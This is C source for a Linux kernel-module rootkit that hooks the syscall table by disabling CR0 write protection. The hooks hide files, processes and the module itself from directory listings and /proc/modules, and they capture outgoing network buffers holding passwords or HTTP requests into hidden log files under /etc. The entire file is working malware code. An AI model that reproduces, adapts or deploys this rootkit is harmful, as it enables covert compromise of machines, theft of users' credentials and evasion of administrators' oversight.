#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/delay.h>
#include <asm/paravirt.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <asm/uaccess.h>	// Needed by segment descriptors
#include <linux/slab.h>
#include <linux/path.h>
#include <linux/namei.h>

#define BEGIN_BUF_SIZE 10000
#define CMDLINE_SIZE 100
#define MAX_PROC_PATH 30
#define FULL_LOG_PATH 30
#define LOG_SEPARATOR "\n.............................................................\n"

//configuration
#define file_suffix ".rootkit"
#define command_contains ".//./"
#define rootkit_name "rootkit"


DEFINE_MUTEX(log_mutex_pass);
DEFINE_MUTEX(log_mutex_http);

struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	char d_name[];
};


unsigned long **sys_call_table;
unsigned long original_cr0;

asmlinkage long (*ref_sys_read) (unsigned int fd, char __user * buf,
    size_t count);
asmlinkage long (*ref_sys_getdents) (unsigned int,
    struct linux_dirent __user *, unsigned int);
asmlinkage long (*ref_sys_getdents64) (unsigned int,
    struct linux_dirent64 __user *, unsigned int);
asmlinkage long (*ref_sys_sendto) (int, void __user *, size_t, unsigned,
    struct sockaddr __user *, int);
asmlinkage long (*ref_sys_open) (const char __user * filename,
    int flags, umode_t mode);


/*functions for r/w files copied from stackoverflow*/

struct file *file_open(const char *path, int flags, int rights)
{
	struct file *filp = NULL;
	mm_segment_t oldfs;
	int err = 0;

	oldfs = get_fs();
	set_fs(get_ds());
	filp = filp_open(path, flags, rights);
	set_fs(oldfs);
	if (IS_ERR(filp)) {
		err = PTR_ERR(filp);
		return NULL;
	}
	return filp;
}

void file_close(struct file *file)
{
	filp_close(file, NULL);
}

int file_read(struct file *file, unsigned long long offset,
    unsigned char *data, unsigned int size)
{
	mm_segment_t oldfs;
	int ret;

	oldfs = get_fs();
	set_fs(get_ds());

	ret = vfs_read(file, data, size, &offset);

	set_fs(oldfs);
	return ret;
}

int file_write(struct file *file, unsigned long long offset,
    const unsigned char *data, unsigned int size)
{
	mm_segment_t oldfs;
	int ret;

	oldfs = get_fs();
	set_fs(get_ds());

	ret = vfs_write(file, data, size, &offset);

	set_fs(oldfs);
	return ret;
}

int file_sync(struct file *file)
{
	vfs_fsync(file, 0);
	return 0;
}

/*end of functions for r/w files copied from stackoverflow*/

asmlinkage long new_sys_read(unsigned int fd, char __user * buf, size_t count)
{
	long ret;
	ret = ref_sys_read(fd, buf, count);

	return ret;
}

int check_file_suffix(const char *name)	//checks if file is ending on suffix
{
	int len = strlen(name);
	int suffix_len = strlen(file_suffix);
	if (len >= suffix_len) {
		const char *check_suffix = name;
		check_suffix += len - suffix_len;
		if (strcmp(check_suffix, file_suffix) == 0)
			return 1;
	}
	return 0;
}

void strcat_wrapper(char *dest, const char *from, size_t size)
{
	if (strlen(dest) >= size)
		return;
	strncat(dest, from, size - strlen(dest));
}

int check_process_prefix(const char *name)
{
	int err;
	long pid;
	char path[MAX_PROC_PATH];
	struct file *f;
	char *buf = NULL;
	int res = 0;
	int i;

	err = kstrtol(name, 10, &pid);
	if (err != 0) {
		return res;
	}

	strncpy(path, "/proc/", MAX_PROC_PATH);
	strcat_wrapper(path, name, MAX_PROC_PATH);
	strcat_wrapper(path, "/", MAX_PROC_PATH);
	strcat_wrapper(path, "cmdline", MAX_PROC_PATH);

	f = file_open(path, O_RDONLY, 0);
	if (f == NULL)
		return res;

	buf = kmalloc(CMDLINE_SIZE + 1, GFP_KERNEL);
	if (buf == NULL)
		goto end_;

	memset(buf, 0, CMDLINE_SIZE + 1);

	err = file_read(f, 0, buf, CMDLINE_SIZE);	//todo


	for (i = 0; i < CMDLINE_SIZE; i++) {
		if (buf[i] == 0)
			buf[i] = ' ';
	}

	if (strstr(buf, command_contains)) {
		printk(KERN_DEBUG "hidding %s\n", buf);
		res = 1;
	}

      end_:
	file_close(f);
	kfree(buf);
	return res;
}

int check_file_name(const char *name)
{
	return strcmp(name, rootkit_name) == 0;
}

int should_be_hidden(const char *name)
{
	return check_file_suffix(name) | check_process_prefix(name) |
	    check_file_name(name);
}

asmlinkage long new_sys_getdents(unsigned int fd,
    struct linux_dirent __user * dirent, unsigned int count)
{
	//printk(KERN_DEBUG "getdents start\n");
	long read;
	long bpos;
	struct linux_dirent __user *d;
	read = ref_sys_getdents(fd, dirent, count);
	if (read <= 0)
		return read;
	for (bpos = 0; bpos < read;) {
		d = (struct linux_dirent __user *)((char *)dirent + bpos);
		if (d->d_ino != 0) {
			if (should_be_hidden((char *)d->d_name)) {
				//delete this entry
				int rest = read - (bpos + d->d_reclen);
				int from_ = bpos + d->d_reclen;
				int to_ = bpos;

				struct linux_dirent __user *from =
				    (struct linux_dirent __user *)((char *)
				    dirent + from_);
				struct linux_dirent __user *to =
				    (struct linux_dirent __user *)((char *)
				    dirent + to_);

				memcpy(to, from, rest);
				read -= d->d_reclen;
				continue;
			}
		}
		bpos += d->d_reclen;
	}

	//printk(KERN_DEBUG "getdents end\n");
	return read;
}

asmlinkage long new_sys_getdents64(unsigned int fd,
    struct linux_dirent64 __user * dirent, unsigned int count)
{
	//printk(KERN_DEBUG "getdents64 start\n");
	long read;
	long bpos;
	struct linux_dirent64 __user *d;
	read = ref_sys_getdents64(fd, dirent, count);
	if (read <= 0)
		return read;
	for (bpos = 0; bpos < read;) {
		d = (struct linux_dirent64 __user *)((char *)dirent + bpos);
		if (d->d_ino != 0) {
			if (should_be_hidden((char *)d->d_name)) {
				//delete this entry
				int rest = read - (bpos + d->d_reclen);
				int from_ = bpos + d->d_reclen;
				int to_ = bpos;

				struct linux_dirent64 __user *from =
				    (struct linux_dirent64 __user *)((char *)
				    dirent + from_);
				struct linux_dirent64 __user *to =
				    (struct linux_dirent64 __user *)((char *)
				    dirent + to_);

				memcpy(to, from, rest);
				read -= d->d_reclen;
				continue;
			}
		}
		bpos += d->d_reclen;
	}

	//printk(KERN_DEBUG "getdents64 end\n");
	return read;
}

void save_to_log(const char *log_type, const char *what, size_t size)
{
	int err;
	struct file *f;
	long long file_size;
	struct path p;
	struct kstat ks;
	char full_path[FULL_LOG_PATH + 1] = "/etc/";

	strcat_wrapper(full_path, log_type, FULL_LOG_PATH);
	strcat_wrapper(full_path, file_suffix, FULL_LOG_PATH);

	printk(KERN_INFO "saving to log\n");

	f = file_open(full_path, O_WRONLY | O_CREAT, 0777);
	if (f == NULL)
		return;

	kern_path(full_path, 0, &p);
	err = vfs_getattr(&p, &ks);
	if (err)
		return;

	printk(KERN_INFO "size: %lld\n", ks.size);
	file_size = ks.size;
	err = file_write(f, file_size, what, size);
	if (err == -EINVAL)
		return;

	file_size += size;
	err = file_write(f, file_size, LOG_SEPARATOR, strlen(LOG_SEPARATOR));
	if (err == -EINVAL)
		return;
	file_close(f);

	printk(KERN_INFO "ok\n");
}

int password_found(const char *buf, size_t size)
{
	if (strnstr(buf, "password=", size))
		return 1;
	if (strnstr(buf, "pass=", size))
		return 1;
	if (strnstr(buf, "haslo=", size))
		return 1;
	return 0;
}

int http_header_found(const char *buf, size_t size)
{
	//printk(KERN_INFO "%s\n", buf);
	if (strnstr(buf, "POST /", size))
		return 1;
	if (strnstr(buf, "GET /", size))
		return 1;
	return 0;
}

asmlinkage long new_sys_sendto(int fd, void __user * buff, size_t len,
    unsigned int flags, struct sockaddr __user * addr, int addr_len)
{
	long ret;

	//printk(KERN_DEBUG "sendto start\n");

	if (password_found(buff, len)) {
		printk(KERN_INFO "password found\n");
		mutex_lock(&log_mutex_pass);
		save_to_log("passwords", buff, len);
		mutex_unlock(&log_mutex_pass);
	}

	if (http_header_found(buff, len)) {
		printk(KERN_INFO "http found\n");
		mutex_lock(&log_mutex_http);
		save_to_log("http_requests", buff, len);
		mutex_unlock(&log_mutex_http);
	}

	ret = ref_sys_sendto(fd, buff, len, flags, addr, addr_len);

	//printk(KERN_DEBUG "sento end\n");
	return ret;
}

char *read_whole_file(struct file *f)
{
	int buf_size = BEGIN_BUF_SIZE;
	int res;
	int read = 0;
	char *buf = kzalloc(buf_size + 1, GFP_KERNEL);

	res = file_read(f, read, buf + read, buf_size - read);
	while (res > 0) {
		read += res;
		if (read == buf_size) {
			char *new_buf = kzalloc(buf_size * 2 + 1, GFP_KERNEL);
			memcpy(new_buf, buf, buf_size);
			buf_size = buf_size * 2;
			kfree(buf);
			buf = new_buf;
		}
		res = file_read(f, read, buf + read, buf_size - read);
	}
	return buf;
}

//when open("/proc/modules") is called, reate fake file with removed rootkit entry and redirect to this file
asmlinkage long new_sys_open(char __user * filename, int flags, umode_t mode)
{
	long ret;
	if (strcmp(filename, "/proc/modules") == 0) {
		struct file *fake_modules;
		struct file *real_modules;
		mm_segment_t old_fs;
		char *modules_buf;
		char *rootkit, *rootkit_end;
		char *new_path;
		long res;

		printk(KERN_INFO "open /proc/modules\n");

		new_path =
		    kzalloc(strlen("/tmp/modules") + strlen(file_suffix) + 1,
		    GFP_KERNEL);
		strcpy(new_path, "/tmp/modules");
		strcat(new_path, file_suffix);

		real_modules = file_open("/proc/modules", O_RDONLY, 0);
		if (real_modules == NULL)
			return ref_sys_open(filename, flags, mode);

		char full_path[FULL_LOG_PATH + 1] = "/tmp/";
		strcat_wrapper(full_path, "modules", FULL_LOG_PATH);
		strcat_wrapper(full_path, file_suffix, FULL_LOG_PATH);

		//open files
		fake_modules =
		    file_open(new_path, O_WRONLY | O_CREAT | O_TRUNC, 0777);
		if (fake_modules == NULL)
			return ref_sys_open(filename, flags, mode);

		modules_buf = read_whole_file(real_modules);
		if (modules_buf == NULL)
			return ref_sys_open(filename, flags, mode);

		//remove rootkit from modules list
		rootkit = strstr(modules_buf, rootkit_name);
		if (rootkit)	//shouldn't be NULL anyway - only if rootkit name is bad configured in #define
		{
			rootkit_end = rootkit;
			while (*rootkit_end != '\n')
				rootkit_end++;
			memcpy(rootkit, rootkit_end + 1, strlen(rootkit_end) + 1);	//wiping rootkit entry
		}
		//save modules list to fake file
		res =
		    file_write(fake_modules, 0, modules_buf,
		    strlen(modules_buf));

		file_close(fake_modules);
		file_close(real_modules);
		kfree(modules_buf);

		//http://stackoverflow.com/questions/7629141/allocate-user-space-memory-from-kernel
		old_fs = get_fs();
		set_fs(KERNEL_DS);
		//redirect open("/proc/modules") to fake file
		ret = ref_sys_open(new_path, flags, mode);
		set_fs(old_fs);
	} else {
		ret = ref_sys_open(filename, flags, mode);
	}
	return ret;
}

//from https://bbs.archlinux.org/viewtopic.php?id=139406

static unsigned long **aquire_sys_call_table(void)
{
	unsigned long int offset = PAGE_OFFSET;
	unsigned long **sct;

	while (offset < ULLONG_MAX) {
		sct = (unsigned long **)offset;

		if (sct[__NR_close] == (unsigned long *)sys_close)
			return sct;

		offset += sizeof(void *);
	}

	return NULL;
}

#define register(name) \
 ref_sys_##name = (void *)sys_call_table[__NR_##name]; \
 sys_call_table[__NR_##name] = (unsigned long *)new_sys_##name;

#define unregister(name) \
 sys_call_table[__NR_##name] = (unsigned long *)ref_sys_##name;

static int __init rootkit_start(void)
{
	if (!(sys_call_table = aquire_sys_call_table()))
		return -1;

	original_cr0 = read_cr0();

	write_cr0(original_cr0 & ~0x00010000);

	register (getdents);
	register (getdents64);
	register (sendto);
	register (open);

	write_cr0(original_cr0);

	return 0;
}

static void __exit rootkit_end(void)
{
	if (!sys_call_table) {
		return;
	}

	write_cr0(original_cr0 & ~0x00010000);

	unregister(getdents);
	unregister(getdents64);
	unregister(sendto);
	unregister(open);

	write_cr0(original_cr0);

	msleep(2000);
}

module_init(rootkit_start);
module_exit(rootkit_end);

MODULE_LICENSE("GPL");
